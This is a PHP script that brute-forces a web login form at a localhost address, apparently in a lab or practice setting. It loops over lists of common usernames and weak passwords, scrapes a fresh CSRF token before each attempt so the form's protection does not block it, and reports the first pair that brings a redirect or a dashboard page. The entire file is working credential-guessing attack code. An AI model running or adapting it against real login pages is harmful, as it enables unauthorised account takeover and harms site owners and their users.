<?php
$base = 'http://127.0.0.1:8080';
$users = ['josh', 'admin', 'admin123', 'user', 'test'];
$passlist = ['admin', 'admin123', '123456', 'password', 'pass', 'josh', 'josh123', 'secret', 'welcome', '1234'];

foreach ($users as $user) {
    foreach ($passlist as $pass) {
        $ch = curl_init($base . '/login');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, __DIR__ . '/cookies.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, __DIR__ . '/cookies.txt');
        $html = curl_exec($ch);
        preg_match('/name="csrf_test_name" value="([^"]+)"/', $html, $m);
        $token = $m[1] ?? '';

        $fields = ['csrf_test_name' => $token, 'username' => $user, 'password' => $pass];
        $ch2 = curl_init($base . '/login');
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch2, CURLOPT_COOKIEJAR, __DIR__ . '/cookies.txt');
        curl_setopt($ch2, CURLOPT_COOKIEFILE, __DIR__ . '/cookies.txt');
        curl_setopt($ch2, CURLOPT_POST, true);
        curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($fields));
        curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, false);
        $response = curl_exec($ch2);
        $info = curl_getinfo($ch2);
        if ($info['http_code'] == 302 || str_contains($response, 'Dashboard') || str_contains($response, 'Login successful')) {
            echo "MATCH: user=$user pass=$pass http={$info['http_code']}\n";
            exit;
        }
    }
}

echo "NO_COMMON_MATCH\n";
